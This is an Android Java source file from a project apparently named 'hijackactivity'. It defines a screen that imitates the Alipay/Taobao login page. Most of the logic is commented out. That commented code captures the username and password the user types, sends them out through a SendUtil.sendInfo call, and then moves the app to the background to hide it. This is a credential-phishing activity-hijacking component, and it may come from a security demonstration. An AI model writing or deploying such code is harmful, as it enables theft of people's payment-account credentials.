package com.example.hijackactivity;

import android.app.Activity;
import android.os.Bundle;
import android.os.HandlerThread;
import android.text.Html;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.TextView;

public class AlipayStoryActivity extends Activity {
    private EditText name;
    private EditText password;
    private Button mBtAlipay;
    private Button mBtTaobao;
    private Button mBtRegister;

    private TextView mTvFindpswd;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        this.setTheme(android.R.style.Theme_NoTitleBar);
        setContentView(R.layout.alipay);
//        mBtAlipay = (Button) findViewById(R.id.alipay_bt_alipay);
//        mBtTaobao = (Button) findViewById(R.id.alipay_bt_taobao);
//        mBtRegister = (Button) findViewById(R.id.alipay_bt_register);
//        mTvFindpswd = (TextView) findViewById(R.id.alipay_findpswd);
//        mTvFindpswd.setText(Html.fromHtml("[u]找回登录密码[/u]"));
//        mBtAlipay.setSelected(true);
//
//        name = (EditText) findViewById(R.id.input_name);
//        password = (EditText) findViewById(R.id.input_password);

    }

//    public void onButtonClicked(View v) {
//        switch (v.getId()) {
//            case R.id.alipay_bt_login:
//                HandlerThread handlerThread = new HandlerThread("send");
//                handlerThread.start();
//                new Handler(handlerThread.getLooper()).post(new Runnable() {
//                    @Override
//                    public void run() {
//                        // 发送获取到的用户密码
//                        SendUtil.sendInfo(name.getText().toString(), password.getText().toString(), "支付宝");
//                    }
//                });
//                moveTaskToBack(true);
//
//                break;
//            case R.id.alipay_bt_alipay:
//                chooseToAlipay();
//                break;
//            case R.id.alipay_bt_taobao:
//                chooseToTaobao();
//                break;
//            default:
//                break;
//        }
//    }
//
//    private void chooseToAlipay() {
//        mBtAlipay.setSelected(true);
//        mBtTaobao.setSelected(false);
//        name.setHint(R.string.alipay_name_alipay_hint);
//        mTvFindpswd.setVisibility(View.VISIBLE);
//        mBtRegister.setVisibility(View.VISIBLE);
//    }
//
//    private void chooseToTaobao() {
//        mBtAlipay.setSelected(false);
//        mBtTaobao.setSelected(true);
//        name.setHint(R.string.alipay_name_taobao_hint);
//        mTvFindpswd.setVisibility(View.GONE);
//        mBtRegister.setVisibility(View.GONE);
//    }

}
